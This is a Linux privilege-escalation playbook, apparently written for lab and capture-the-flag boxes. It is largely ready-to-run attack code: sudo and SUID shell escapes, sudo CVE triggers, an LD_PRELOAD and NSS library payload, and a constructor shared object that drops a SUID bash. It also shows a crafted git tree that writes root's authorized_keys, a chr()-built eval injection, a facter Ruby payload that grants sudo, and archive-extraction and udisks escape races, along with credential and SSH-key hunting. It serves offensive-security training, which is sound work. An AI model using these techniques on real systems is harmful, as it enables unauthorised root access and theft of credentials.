# Linux privilege escalation

Enumerate manually first — the checks below take 60 seconds and find the
intended path most of the time. Run linpeas as a backstop, not as step one; its
output is long and easy to drown in.

## Manual sweep

```bash
id; sudo -l
uname -a; cat /etc/os-release
cat /etc/passwd | grep -v nologin
ls -la /home/*; ls -la ~
find / -perm -4000 -type f 2>/dev/null            # SUID
find / -perm -2000 -type f 2>/dev/null            # SGID
getcap -r / 2>/dev/null                            # capabilities
cat /etc/crontab; ls -la /etc/cron.*
ps aux --forest | head -60
netstat -tulpn 2>/dev/null || ss -tulpn            # internal-only services
find / -writable -type d 2>/dev/null | grep -v proc | head
```

**Ask the filesystem what each of your groups grants.** `id` gives you group names;
their names are marketing, the file list is the truth:

```bash
for g in $(id -Gn); do echo "== $g"; find / -group "$g" -not -path '/proc/*' 2>/dev/null | head -20; done
```

A non-default supplementary group usually gates a handful of paths, and they tend
to explain each other — a service's config plus the key material that config
references. That is a two-command answer to "why does this account exist", and it
beats reasoning about what a group called `deployers` or `operator` *sounds* like
it should do.

Credential hunting:
```bash
grep -rniE 'password|passwd|secret|api[_-]?key' /var/www /opt /home /etc 2>/dev/null | grep -v Binary | head -50
ls -la /var/backups /tmp /opt
cat ~/.bash_history; cat ~/.ssh/id_*
find / -name '*.kdbx' -o -name '.env' -o -name 'config.php' -o -name 'wp-config.php' 2>/dev/null
```

## sudo -l

The single highest-yield check. Any allowed binary → look it up on GTFOBins:
```
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/profile      # then !/bin/sh
```
`env_keep+=LD_PRELOAD` present → compile a shared object with a `_init` that
spawns a shell, then `sudo LD_PRELOAD=/tmp/x.so <anything>`. `LD_LIBRARY_PATH`
kept works the same way with a fake `libc`.

**On openSUSE, `(ALL) ALL` + `Defaults targetpw` is the distro default, not a
grant.** It means *any* user may run anything — **after supplying the target
(root) password**, which you do not have. Do not read it as "already won"; read it
as "the escalation is elsewhere, or root's password is recoverable." Corollary:
an admin-looking account you're tempted to crack toward may be a **decoy** — a
locked account (`!`/`*` in `/etc/shadow`) cannot log in at all, so a slow bcrypt
for it is never the intended step. If a hash is too slow to be crackable in the
time the box implies, re-examine the premise before burning hours on it.
Wildcards in a sudo rule (`sudo /bin/tar -czf /tmp/x /var/www/*`) → checkpoint
injection or filename-as-argument tricks.

**A trailing `*` grants the binary's entire *flag* surface, not just its
operands.** Read the rule the way `sudo` implements it, not the way its author
meant it: everything after the fixed prefix is yours, so any option the binary
accepts is in scope — including options that change *what privilege the work runs
with*. Rules of this shape look restrictive and are usually equivalent to root.
Take the allowed prefix, read the binary's `--help`, and ask which flag changes
the security context rather than the output:

- container runtimes — `--privileged`, `-u 0`, `--cap-add`, `-v /:/host`,
  `--pid=host` (a `docker exec *` rule is root: `--privileged` gives the exec'd
  process the full capability set, and with `CAP_SYS_ADMIN` plus the host's block
  devices visible in the container you `mount /dev/sdaN /mnt/h` and read/write
  the host filesystem, or `chroot` it for a shell — see `containers.md`)
- anything with `-o`/`--output`/`--config`/`-f` — write as root, or load a config
  that loads code (`httpd -f`, `rsync --rsync-path`, `tar --to-command`)
- interpreters and multiplexers — `-e`, `-c`, `--exec`, `--eval`, `-C <dir>`

The escalation here is a *documented feature* of the allowed binary, so nothing
looks anomalous. When you write it up, name the wildcard as the vulnerability,
not the runtime.
`(ALL, !root)` in older sudo → CVE-2019-14287, `sudo -u#-1 /bin/bash`.
Sudo `< 1.9.5p2` → Baron Samedit (CVE-2021-3156), a heap overflow reachable with
**no sudo rights at all** (`sudoedit -s '\' $(perl -e 'print "A"x1000')` to
confirm it segfaults). `sudo -l` needing no password after you already ran one →
a live sudo token you can reuse.
Sudo `1.9.14`–`1.9.17` → chroot NSS load (CVE-2025-32463), also reachable with
**no sudo rule at all** — `sudo -R <evil_chroot> <cmd>` loads
`libnss_/<svc>.so.2` from a chroot you control before authorization runs. But the
upstream version string lies: a distro can backport the fix and keep the number,
so **pin the package version** (`dpkg -l sudo` / `rpm -q sudo`), not `sudo -V`. A
suffix like `1.9.15p5-3ubuntu5.24.04.2` is the patched security update and the
exploit fails cleanly — verify empirically before spending time. When you do
build the NSS module, compile it with `-nostdlib` and raw `syscall`s so it carries
no glibc-version symbols and `dlopen` works across target glibc versions.

Quick classes the sweep already surfaced:
- **Writable `/etc/passwd`** → add a root-uid user with a known hash
  (`openssl passwd -1`), `su` to it. Writable `/etc/shadow` → same idea.
- **PATH hijack** → a root cron/SUID/script calling a bare command (`tar`, not
  `/bin/tar`) with a PATH you can prepend → drop a malicious `tar` first in PATH.
- **PwnKit (CVE-2021-4034)** — `pkexec` present and SUID is the give-away; a
  config bug, not a kernel bug, so it's safe to try early on older images.
- **polkit/D-Bus** → `busctl list` for services running as root that expose a
  method you can call (e.g. `CreateUser`, package-install actions). A root daemon
  reachable by any local user over the system bus is a privesc surface even with
  no group or sudo right: the classes are a permissive polkit rule (a method that
  returns `yes`/`auth_admin_keep` for `unix-user:*`), an argument-injection into
  what the daemon runs, and a **TOCTOU race** where a "safe" call authorises and a
  second call swaps in a dangerous payload before the check resolves. A
  *package-manager* daemon (PackageKit `InstallFiles`, `packagekitd`) is the
  highest-value target because "install a package as root" is arbitrary code via a
  maintainer script — so a version-gated CVE there beats any kernel bug. The
  install pattern is one-line: a `.deb` whose `postinst` (or `.rpm` `%post`) does
  `install -m 4755 /bin/bash /var/tmp/.x`, then `bash -p`. Prereqs to check on the
  target before building: `python3-gi` (the D-Bus client), `dpkg-deb`/`rpmbuild`,
  and a drop dir with neither `nosuid` nor `noexec` (`/dev/shm` is usually
  `nosuid`; `/var/tmp` usually is not). *(snapped: PackageKit `InstallFiles`
  SIMULATE→NONE flag race, CVE-2026-41651)*

## SUID / capabilities

Compare the SUID list against a stock system — anything unusual is the path.

**Pin the version of an unusual SUID binary before deciding it is uninteresting.**
GTFOBins entries are frequently *version-conditional*: a tool acquires a scripting
or interactive mode, it gets abused, and upstream removes it in a later release.
So the binary on a modern box is inert while the identically-named one on an old
box is a one-command root. `ls -la` it for the mode, then run its `--version`.
Look for any subcommand that hands a string to `system()`: an interactive prompt
with a `!`/`shell` escape, an embedded scripting engine, a `--exec`/`-o` hook, a
config file that names a program to run. Most such modes read stdin, so they
weaponise non-interactively with `echo "<escape> <cmd>" | binary <mode>` — which
matters when your foothold is a synchronous exec primitive with no TTY.

Confirm you actually crossed the boundary before celebrating: `uid` non-zero with
`euid=0` is the signature of a setuid binary rather than a login, and some
payloads need `bash -p` to keep the euid.
*(lame: `/usr/bin/nmap` 4.53 mode 4755 — `--interactive` plus its `!` escape,
removed upstream in 5.20; two `echo | nmap --interactive` lines made a setuid
shell)*

GTFOBins again for the standard binaries. `cap_setuid+ep` on python/perl:
```bash
./python -c 'import os;os.setuid(0);os.system("/bin/bash")'
```

## Cron, timers and custom scripts

```bash
./pspy64                                    # jobs /etc/crontab does not list
systemctl list-timers --all --no-pager      # systemd timers are not in crontab
ls -la /etc/cron.d /etc/cron.*/ /etc/systemd/system/*.service
```
A root cron running a script you can write, or running a relative path with a
writable PATH component, is a direct win. Also check for `tar`/`rsync`
wildcards in cron commands.

**A suggestive directory is not a vulnerability until you find its consumer.** A
non-default world-writable (often setgid) directory owned by a service group is
exactly the shape of a "root job ingests files you can drop here" privesc, and it
will pull you in. Before spending time on it, *prove something reads it*: grep
`/etc`, all unit files and `.path` watchers for the path, `grep -rl` the path
across binaries in `/usr/local`,`/usr/bin`,`/opt`, check for an open handle
(`ls -l /proc/*/fd | grep <dir>`), and drop a canary and watch it with `pspy` — if
nothing touches it in a few minutes it is a decoy, park it and move on. Match the
`pspy` interval to the suspected job; a 60 s window misses a 2–3 min cron, so
watch for 2–3× the longest plausible period before concluding "no job".

**Read any custom script you can, even when you cannot write it.** A
world-readable script run by root is worth more than a config file you cannot
read, because it tells you what root does with data you might control. Work
through it asking: where does its input come from, and can I influence that
input? Check the unit for `User=` and the log file's owner to confirm what it
runs as:

```bash
cat /etc/systemd/system/<name>.service | grep -E 'User=|ExecStart='
ls -la /var/log/<name>.log
```

The recurring bug class is a root job joining an attacker-influenced name onto a
directory:

```python
target = os.path.join(base_dir, name_from_untrusted_source)   # no containment check
```

`os.path.join` does not normalise `..`, and it *discards* `base_dir` entirely if
the second argument is absolute. Anything that feeds it filenames from a
database, an API response, an archive, or a git tree is a candidate for
arbitrary file write as root. Useful targets, in order of cleanliness:
`/root/.ssh/authorized_keys` (additive, reversible), a file in `/etc/cron.d`
(needs mode 0644), a script in `/etc/cron.hourly` (needs the execute bit).

**A hand-rolled symlink check that inspects only the *first* hop is defeated by a
symlink chain.** A root log-viewer / file-reader often "validates" a symlink like
`target=$(ls -l "$dir/$name" | awk '{print $NF}')` and rejects `target` if it
contains `/` or `..` — then `cat`s the path anyway. `ls -l` shows only the
*immediate* target, but `cat` follows the *whole* chain. So chain it: hop-1 is an
innocent relative name in the same dir (passes the check), hop-2 (which the check
never sees) points at the real prize:

```bash
ln -sf /root/.ssh/id_ed25519  "$logdir/y"   # hop 2: absolute, never inspected
ln -sf y                      "$logdir/x"   # hop 1: relative → passes the check
sudo <tool> logs x                          # cats root's private key → ssh root@host
```

You need write in the directory the tool reads — own it, or reach it as the tool's
service user (a lateral step is often exactly for this). The same flaw enables an
arbitrary-write variant when the root job *writes* through the first-hop-checked
name. The clean fix is `realpath`/`readlink -f` + a prefix-containment test, so
name that as the vulnerability. **Prefer this read/logic flaw to racing a
`rm`+recreate symlink guard elsewhere in the same script** — enumerate every
subcommand of a root-run tool before committing to a fragile write race.

Note that `git` is a common untrusted source here — and that git's own
restrictions are a porcelain behaviour, not a format one. `git add` refuses a
path containing `..`, but tree objects are just name-to-hash maps and
`git mktree` writes them directly:

```bash
BLOB=$(cat payload | git hash-object -w --stdin)
T=$(printf '100644 blob %s\tauthorized_keys\n' "$BLOB" | git mktree)
T=$(printf '040000 tree %s\t.ssh\n' "$T" | git mktree)
T=$(printf '040000 tree %s\troot\n' "$T" | git mktree)
for i in $(seq 1 5); do T=$(printf '040000 tree %s\t..\n' "$T" | git mktree); done
C=$(echo x | git commit-tree "$T"); git update-ref refs/heads/main "$C"
git ls-tree -r HEAD     # verify the path the consumer will see
```

Count the `..` levels against the consumer's base directory, and confirm with
`git ls-tree -r` before pushing. Forges do not fsck incoming objects by default,
so such a tree usually survives a push.

A second recurring class in these root scripts is a command *rebuilt from a
process's own command line*. A health-check or supervisor that does

```bash
while read pid cmdline; do cmd="${cmdline/foo/foo-variant} -flag"; $cmd; done \
  <<< "$(pgrep -lfa '^/opt/app/bin/foo ')"
```

runs `$cmd` unquoted as root, and *you* control `cmdline` — any local user can
launch a process with an arbitrary command line. Set it with `exec -a` so
`/proc/<pid>/cmdline` matches the `pgrep` pattern and appends the arguments you
want executed; use a do-nothing `int main(){for(;;)pause();}` binary as the exec
target so there is no trailing argv junk:

```bash
setsid bash -c 'exec -a "/opt/app/bin/foo --serve -d /opt/app/conf -f /tmp/eve.conf" /tmp/forever' &
```

Supervisors are the common host: `monit` `check program` runs its script as root
each cycle — read `/etc/monit/conf.d/*` (world-readable) and query the UI
(`curl -u admin:monit http://127.0.0.1:2812/_status`) to see which checks are
*active* before building anything. The lesson generalises past this exact sink:
any root job that turns `ps`/`pgrep` output back into a command is injectable.

When the injected command is a web/app server run in a *config-test* mode, the
test still loads modules — `httpd -t` / `apachectl -t` processes `LoadModule`, so
it `dlopen`s the named `.so` and runs its constructor as root. Weaponise by
injecting `-f <your.conf>` (single-token args survive the unquoted word-split)
pointing at a one-line `LoadModule x /tmp/e.so`; the `.so` is just

```c
__attribute__((constructor)) void go(void){ system("cp /bin/bash /tmp/.rb; chmod 4755 /tmp/.rb"); }
```

Compile natively on-target (`gcc -shared -fPIC -nostartfiles`), then `/tmp/.rb -p`.
The constructor fires during the dlopen, before any "not a real module" error.

## Services and internal ports

Something listening on 127.0.0.1 that is not exposed externally is usually
where the escalation lives — an unauthenticated admin panel, a Redis, a
database. Forward it out (see `references/pivoting.md`) and attack it.

**Map each localhost port to its owning UID before assuming it's harmless.**
`ps` may hide other users' processes (`hidepid`), but `/proc/net/tcp` still lists
every listener with its socket owner:
`awk 'NR>1{split($2,a,":"); print strtonum("0x"a[2]), $8}' /proc/net/tcp | sort -nu`
(field 8 = UID). A stack of "media"/"monitoring" daemons all owned by **UID 0**
is the tell: any command sink in one of them is a *root* command sink, not a
service-user one. Rank these by "runs as root" before "looks exploitable".

**UID 0 says "root", not "interesting" — eliminate the box's own runtime daemons
before you fuzz.** The same `/proc/net/tcp` trick that finds a root listener will
not tell you *which* root process owns it, and you cannot read root's
`/proc/<pid>/fd` from a low-priv shell. So before spending a wordlist on an
unidentified port, list the root processes already visible in `ps` and ask which
of them plausibly opens an HTTP socket. On any container host that is a short
list — `containerd`, `dockerd`, `docker-proxy` are all root, all Go, and all
capable of a debug/metrics listener on a high loopback port. Cheap discriminators,
in order: (1) does a known daemon explain it; (2) does the service's own package
or config document a debug/metrics address; (3) only then fuzz. **A non-default
404 body is not evidence of a bespoke service** — plenty of standard daemons ship
a custom string, and treating "this isn't Go's default 404" as proof of a custom
app is how half an hour disappears into a runtime's debug endpoint.

**A root daemon whose auth secret is a readable file is pre-authenticated for
you.** Web/agent daemons commonly sign requests or check a token; read the
verifier before trying to crack anything. Two recurring own-goals turn the
"secret" into a public value:
- the stored credential *is already the hash*, and the code accepts that stored
  value **as the signing key** — so possession of the world-readable hash (no
  crack) forges valid admin requests;
- an inter-node/cluster token doubles as a full API bypass when replayed.

Then look for the config-as-command-sink: a field the (now-authenticated) admin
API writes into the daemon's own config that later runs as a shell command —
event hooks, notification "run a command", `on_*`/`ExecStart*`. Set it, then find
the daemon's *own* synchronous trigger (a webcontrol `action/…`, a "test",
`emulate`) so you don't wait on a natural event. Class example: a root-owned
CCTV/monitoring UI where the request signature key is the readable admin-password
hash and a "command notification" field is appended to the capture daemon's
`on_event_start`. Pin the version, read the verifier and the config mapping,
choose the sink — never memorise one product's recipe.

## Password reuse

Every password you have found, tried against every user in `/etc/passwd`, plus
`su`. This resolves a large fraction of lab boxes and costs nothing.

## Containers

If `/.dockerenv` exists, the cgroup shows docker/lxc, or `hostname` is a short
hex — you're in a container, and "root" here is not the host. The escape is
usually a mounted socket or an over-broad capability, not a kernel bug. Full
escape catalog (docker.sock, privileged, `CAP_SYS_ADMIN` release_agent,
`SYS_PTRACE`, `SYS_MODULE`, host mounts, `/proc` tricks) is in
**`references/containers.md`**.

If there is a Kubernetes service account (`/var/run/secrets/kubernetes.io/…`) or
the host runs a cluster (k3s/kubeadm/microk8s), the container is usually one step
of a larger chain — enumerate the SA's RBAC and the kubelet before reaching for a
local exploit. See `references/kubernetes.md`.

## A root service that evaluates filtered input — a char allow-list is not a sandbox

A common lab privesc is a root-owned local helper (a Flask/socket daemon on
`127.0.0.1`, a cron consumer, a notification/formatter) that takes attacker
data and feeds it to a language `eval`/`exec`/template engine, "protected" by an
input regex. Enumerate them: `ps -eo user,cmd | grep -iE 'python|node|ruby|perl'`
for root interpreters, `ss -ltnp` for loopback listeners, and read any
root-run script you can (`/usr/local/bin/*.py`, systemd units). Then read *how*
it uses your input, not whether it filters it.

The reasoning that beats the filter:

1. **Find the sink.** A double-templating shape is the classic tell —
   `eval(f"f'''{template}'''")` where `template` already interpolated your field,
   so a `{...}` in your input survives the first pass as text and is *evaluated*
   by the second. Same class: `Template(...).render()`, `%`-format with a
   `__getitem__`, `subprocess(..., shell=True)` on a "sanitised" string.
2. **Read the allow-list for what it still permits, not what it blocks.** A
   regex like `^[a-zA-Z0-9._'"(){}=+/]+$` blocks spaces, commas and `;` — which
   *looks* airtight for command building — but leaves `() {} . + / ' "`. That is
   enough to call functions and index attributes.
3. **Rebuild every forbidden byte at runtime.** Whatever the eval scope already
   imports is yours (`os`, `sys`, `subprocess` — check the file's imports), and
   built-ins (`chr`, `getattr`, `bytes`) are always in scope. Forbidden chars
   come from `chr(N)`: space `chr(32)`, `;` `chr(59)`, `,` `chr(44)`. Assemble a
   shell string with `+`, keeping every literal fragment inside the allow-list:
   `os.system('cp'+chr(32)+'/bin/bash'+chr(32)+'/tmp/x'+chr(59)+'chmod'+chr(32)+'+s'+chr(32)+'/tmp/x')`.
   No commas are needed because `chr` and `os.system` are single-argument; if you
   need multi-arg calls, `exec(<chr-built string>)` sidesteps the comma ban
   entirely — the real program lives inside the built string, not your literal.
4. **Satisfy the delivery precondition.** These helpers often gate on
   `remote_addr == 127.0.0.1` or a Unix socket — you already have a local
   foothold, so send from the box (raw socket / `python3`, since `curl` may be
   absent). Prefer a **side-effect** payload (drop a SUID `bash`, write
   `authorized_keys`) over a reverse shell: the response usually shows only the
   function's return value (e.g. `os.system`'s exit code `0`), not stdout.

Fix to cite in the report: never evaluate templated data — compute the value and
interpolate with `.format()`/concatenation, or `str.format_map` over a fixed
field set. An input allow-list does not contain an interpreter that has `os` in
scope.

## A local daemon that mounts/handles attacker media as root (udisks/polkit class)

A privileged D-Bus service that acts on a device or filesystem *you* supply is a
root primitive whenever the polkit action is reachable by your session. The
transferable reasoning:

1. **What is your polkit context?** Actions gated `allow_active` need an *active*
   session. Read it with `gdbus call --system --dest org.freedesktop.login1
   --object-path /org/freedesktop/login1 --method
   org.freedesktop.login1.Manager.CanReboot` (`yes` = active, `challenge` = not).
   A remote SSH session is usually not active — **but a PAM/login misconfig can be
   coerced into one.** On openSUSE, dropping `~/.pam_environment` with
   `XDG_SEAT OVERRIDE=seat0` / `XDG_VTNR OVERRIDE=1` makes `pam_systemd` register
   the *next* login as seat0/vt1 = physically present (CVE-2025-6018). Reconnect,
   re-check `CanReboot`.
2. **What does the daemon do with your input as root?** udisks `Filesystem.Resize`
   mounts your image **as root without `nosuid`** for the duration of the resize
   (CVE-2025-6019, udisks2/libblockdev). Anything it mounts, formats, or executes
   on your behalf is the sink.
3. **Plant a root-owned setuid binary on the medium and race the window.**
   `udisksctl loop-setup --file img` then trigger the resize; a tight loop execs
   `<mountpoint>/xpl -p` while it is briefly mounted.

Building the image needs care and is where most attempts fail:
- The suid binary must be **root-owned at creation time** — you need root on the
  build host. No loop-mount available? `mkfs.xfs -p <protofile>` bakes a
  `uid=0`, mode-`04755` inode with no mount (`xpl -u-755 0 0 /path/to/bash`);
  verify with `xfs_db -c 'inode N' -c 'print core.mode core.uid'`.
- Use the **target's own** `bash` (glibc/ABI match), not the container's.
- **XFS refuses a duplicate-UUID mount** — a leftover mount from a prior run pins
  the UUID and every fresh loop of the *same* image then fails to mount
  ("wrong fs type, bad superblock") and the race silently never wins. Rebuild so
  `mkfs.xfs` assigns a new UUID.
- Cleanup gotcha: a suid `bash -p` has euid 0 but **ruid ≠ 0**, and util-linux
  `umount` refuses ("must be superuser"); `setuid(0)` first (one-line python).

**The pointer to this class is often left in plain sight** — read `/var/spool/mail/*`
and MOTD/notice files. A "security notice about unusual `udisksd`/`<daemon>`
activity" is the box telling you which local service to attack.

## Unprivileged user namespaces as a local-root primitive (OverlayFS / FUSE class)

Distinct from a memory-corruption kernel bug: this class is a *logic* flaw
reachable by any user who can create a user namespace, so treat it before the
"last resort" section below. The lever is that inside a userns you are UID 0 and
can `mount` filesystems, and several of those mounts mishandle ownership or
setuid bits. **Enumerate the preconditions first — they are cheap and they tell
you whether the whole class is even on the table:**

```bash
cat /proc/sys/user/max_user_namespaces          # >0 → unprivileged userns allowed
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null   # missing/0 → not restricted
ls -l /dev/fuse; which fusermount fusermount3    # FUSE reachable?
ls /usr/include/fuse* ; which gcc                # can the PoC build ON the box?
uname -r                                         # pin the exact kernel, then hunt the CVE
```

The recurring bug is a **SUID copy-up**: OverlayFS copies a file up from its
`lowerdir` into the `upperdir` without checking that the file's owner is mapped
in the caller's namespace, so a **root-owned setuid** file served from a
*lower* layer becomes a genuine root-setuid binary in the upper layer. Serving
that lower file from a **FUSE** mount is what lets an unprivileged user present a
`root:root` mode-`4755` inode in the first place. The 2023-era instance is
CVE-2023-0386 (kernels < 6.2, mainline 5.15.x included) — as method:

1. FUSE server exposes one file as `-rwsrwxrwx root:root`
   (`./fuse ./lower ./payload`).
2. In a `CLONE_NEWUSER|CLONE_NEWNS` child, map `0 <uid> 1`, `mount -t overlay`
   with `lowerdir=<fuse>`, and touch a file in `merge/` to force the copy-up.
3. `./upper/<file>` is now real-root SUID — exec it (make the payload a shell or
   a reverse-shell stub for a non-interactive run).

Because the preconditions include `gcc` + `libfuse-dev` here, **build on the
target** (glibc/ABI match) rather than fighting a cross-compile from the
container. The public PoC is a compact `make all`; read its `exp.c` so you know
which step is the copy-up. Keep the exact CVE/version in `local.md`, not here —
what transfers is *pin the kernel, check userns+FUSE are open, look for a
mount-side ownership/setuid mishandle*.

**The pointer to this class, too, is often in plain sight** — the same
`/var/spool/mail/*` / MOTD read from the udisks section applies: a notice naming
"OverlayFS / FUSE" or "kernel CVEs this year" is the box telling you to pin the
kernel and hunt this class.

## Kernel exploits — last resort

Only when enumeration is genuinely exhausted. They crash lab boxes and
demonstrate nothing interesting. If you must: match the exact kernel version,
prefer a well-reviewed PoC (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034,
Dirty COW on ancient boxes), and note that PwnKit is a `pkexec` misconfiguration
rather than a kernel bug — check for it early, it is common on older lab images.

## Root job that extracts an attacker-influenced archive

A root cron/sudo/service that unpacks a tarball, zip, git tree or API response
into a directory is a classic arbitrary-write primitive. The modern trap is that
the *safe-looking* mitigations are version-dependent — a script can look hardened
and still be exploitable because the interpreter under it is old.

**Reasoning, in order:**

1. **Who writes the archive, who runs the extract?** If a lower-privileged user
   can place the archive in a directory a root job extracts, you control the
   contents. Group-writable "spool"/"backup"/"incoming" dirs are the tell.
2. **Read the extractor and pin the *interpreter/library* version, not just the
   code.** Python `tarfile.extractall(filter="data"|"tar")` is only as safe as the
   Python running it: the "data"/"tar" filters were bypassable until the June-2025
   fixes (CVE-2025-4517 / CVE-2025-4138 / CVE-2025-4330 / CVE-2024-12718; fixed in
   3.12.11, 3.13.5, 3.9.23, 3.10.18, 3.11.13). A sudo rule that pins a *custom*
   interpreter path (`/usr/local/bin/python3`) is itself a version flag — run
   `sudo <that exact binary> --version`; it is often deliberately behind.
3. **Pick the primitive to the write target.** Arbitrary root-owned write →
   `/etc/sudoers.d/<x>` (`user ALL=(ALL) NOPASSWD:ALL`, instant, parent always
   exists), `/etc/cron.d/<x>`, or `~root/.ssh/authorized_keys` (needs the dir).
   Prefer a target whose parent directory already exists.
4. **No filter at all (old code) = plain tar-slip:** a member named
   `../../../etc/...` or a symlink member pointing outside writes anywhere. Test
   this first; it needs no CVE.

**The CVE-2025-4517 shape (data-filter bypass), as an example of the class:** the
containment check uses `os.path.realpath()`, which silently stops resolving once a
path exceeds `PATH_MAX` (4096) and falls back to string manipulation — so a symlink
chain of long-named dirs makes the filter believe a link resolves *inside* the
staging dir while the kernel follows it to `/`. A public generator builds N
long-dir/short-symlink pairs + a 254-char `..×N` escape symlink + an `escape`→`/`
link, then a member `escape/<abs/path>` writes as root. Match the generator's
destination-length and depth-to-root to the real staging path. Keep the box-specific
recipe in `local.md`; the transferable rule is **"extract-as-root + old interpreter
= arbitrary write, even with a filter set."**

## sudo a tool that loads user-supplied code (facter, and the class)

A `sudo` grant for a program that *loads code or plugins* is root, even when the
program looks inert. The tell is any tool with a `--custom-dir` / `--module-path` /
`--require` / `-e` / config-include flag, or one that auto-loads files from a
directory you can write.

**Puppet `facter` is the canonical example.** `(ALL) NOPASSWD: /usr/bin/facter`
loads *custom facts* (Ruby) from `--custom-dir <dir>`:

```ruby
# <dir>/pwn.rb
Facter.add(:pwn) do
  setcode do
    File.write("/etc/sudoers.d/zz", "user ALL=(ALL) NOPASSWD:ALL\n"); File.chmod(0440,"/etc/sudoers.d/zz")
    "x"
  end
end
# sudo /usr/bin/facter --custom-dir <dir> pwn   (facter runs under use_pty -> ssh -tt)
```

The non-obvious trap: **facter drops privileges for shelled-out commands but runs
in-process Ruby as root.** A `` `cmd` ``/`system(...)` in the fact runs as the
calling user (the SUID copy comes out user-owned, useless); pure Ruby
(`File.read`/`File.write`/`File.chmod`) runs with `Process.euid == 0`. Do the
privileged work in Ruby, not shell. Confirm with `File.write("/tmp/e","#{Process.euid}")`.

Generalises: before writing off a `sudo`-able tool, check whether it interprets a
language or loads modules/config from an attacker-controllable path — Ruby
(`facter`, `rake -f`, `gem`), Python (`-c`, `PYTHONPATH`, `ansible` module dirs),
Perl, Lua, or any `--config`/`--include` that pulls executable content. If it does,
that is the root primitive, no memory-corruption needed.

## Confirm and record

```bash
id                  # uid=0(root)
cat /root/root.txt
```
Write the escalation vector and its evidence file into FINDINGS.md before
moving on to the report.
